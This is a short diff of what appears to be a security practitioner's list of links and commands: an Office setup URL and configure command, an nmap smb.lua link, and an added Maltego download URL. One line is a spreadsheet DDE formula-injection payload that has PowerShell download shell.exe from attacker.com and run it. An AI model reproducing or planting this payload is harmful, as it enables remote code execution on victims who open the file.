@@ -4,3 +4,4 @@ https://www.microsoft.com/en-us/download/details.aspx?id=49117
 (.\setup.exe /configure .\configuration-Office2021Enterprise.xml)
 =cmd|’ /C powershell Invoke-WebRequest “http://www.attacker.com/shell.exe” -OutFile “$env:Temp\shell.exe”; Start-Process “$env:Temp\shell.exe”‘!A1
 https://github.com/nmap/nmap/blob/c491143358f3417ed7f6712ae8a9d3e48699463a/nselib/smb.lua
+https://maltego-downloads.s3.us-east-2.amazonaws.com/linux/Maltego.v4.2.18.13878.deb
